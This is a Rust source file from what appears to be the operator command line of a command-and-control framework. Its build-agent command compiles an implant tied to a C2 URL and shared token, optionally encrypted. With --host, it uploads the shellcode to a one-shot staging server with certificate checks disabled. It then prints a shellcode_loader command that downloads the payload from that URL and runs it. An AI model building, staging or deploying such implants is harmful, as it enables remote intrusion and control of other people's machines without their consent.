//! Build command: build-agent.

use std::path::PathBuf;

use anyhow::{bail, Result};

use crate::build::{build_agent, BuildAgentArgs, Format, Os};
use crate::commands::CliCtx;

#[allow(clippy::too_many_arguments)]
pub fn cmd_build_agent(
    ctx: &CliCtx,
    os: Os,
    format: Format,
    alias: String,
    c2_url: String,
    profile: String,
    shared_token: String,
    output_dir: PathBuf,
    name: String,
    note: Option<String>,
    encrypt: bool,
    host: bool,
) -> Result<()> {
    let args = BuildAgentArgs {
        os,
        format,
        alias,
        c2_url,
        profile,
        shared_token,
        output_dir,
        name,
        note,
        encrypt,
    };
    let result = build_agent(args)?;

    if host {
        let Some((data, key)) = result else {
            println!("[!] --host only applies to shellcode format, skipping upload");
            return Ok(());
        };

        let stage_url = format!("{}/v1/admin/stage?one_shot=true&expire=60", ctx.base);
        let size_mb = data.len() as f64 / 1_048_576.0;
        println!("[*] Uploading {:.2} MB to stage server...", size_mb);
        let mut upload_headers = reqwest::header::HeaderMap::new();
        upload_headers.insert(
            "X-Operator-Token",
            reqwest::header::HeaderValue::from_str(ctx.operator_token)
                .map_err(|e| anyhow::anyhow!("invalid operator token: {e}"))?,
        );
        let upload_cli = reqwest::blocking::Client::builder()
            .timeout(std::time::Duration::from_secs(300))
            .default_headers(upload_headers)
            .danger_accept_invalid_certs(true)
            .build()?;
        let resp = upload_cli
            .post(&stage_url)
            .header("content-type", "application/octet-stream")
            .body(data)
            .send()?;

        if !resp.status().is_success() {
            bail!("stage upload failed: {}", resp.status());
        }

        let body: serde_json::Value = resp.json()?;
        let id = body["id"].as_str().unwrap_or("?");
        let download_url = format!("{}/d/{}", ctx.base, id);

        println!();
        println!("[+] Hosted: {}", download_url);
        if let Some(key_hex) = key {
            println!(
                "[+] Run: shellcode_loader -u {} -e aes -k {} -m thread",
                download_url, key_hex
            );
        } else {
            println!("[+] Run: shellcode_loader -u {} -m thread", download_url);
        }
    }

    Ok(())
}
